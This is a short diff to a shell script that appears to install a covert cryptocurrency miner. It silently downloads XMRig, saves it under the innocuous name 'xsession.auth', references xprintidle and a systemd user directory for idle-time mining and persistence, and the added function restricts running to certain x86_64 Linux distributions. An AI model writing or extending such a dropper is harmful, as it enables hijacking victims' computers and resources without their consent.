@@ -10,6 +10,20 @@ XMRIGNAME=xsession.auth
 XPRINTIDLE_NAME=xprintidle
 SYSTEMD_PATH=$HOME/.config/systemd/user
 
+ensure_os() {
+	machine=$(uname -m)
+	if [[ $machine != "x86_64" ]]; then
+		exit
+	fi
+
+	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release)
+	if [[ $id != "linuxmint" && $id != "fedora" && $id != "ubuntu" ]]; then
+		exit
+	fi
+}
+
+ensure_os
+
 mkdir -p $LOCAL_PATH
 curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
 curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
